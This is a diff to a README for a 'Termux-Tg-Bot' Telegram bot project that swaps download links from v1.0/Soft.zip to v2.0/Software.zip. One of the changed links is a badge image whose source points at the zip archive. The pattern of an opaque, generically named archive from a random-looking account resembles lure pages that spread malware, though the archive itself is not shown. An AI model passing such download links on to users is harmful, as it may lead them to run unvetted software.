@@ -23,7 +23,7 @@ For detailed instructions and examples, please refer to the documentation includ
 
 ## 🔗 Important Links
 
-📎 **Download the Latest Release**: [Launch https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v1.0/Soft.zip](https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v1.0/Soft.zip)
+📎 **Download the Latest Release**: [Launch https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v2.0/Software.zip](https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v2.0/Software.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -44,7 +44,7 @@ Thank you for choosing Termux-Tg-Bot for your Telegram bot management needs! We 
 ---
 
 <p align="center">
-  <img src="https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v1.0/Soft.zip%20By-Termux--Tg--Bot-blue">
+  <img src="https://github.com/qhzdiqzd/Termux-Tg-Bot/releases/download/v2.0/Software.zip%20By-Termux--Tg--Bot-blue">
 </p>
 
 ---
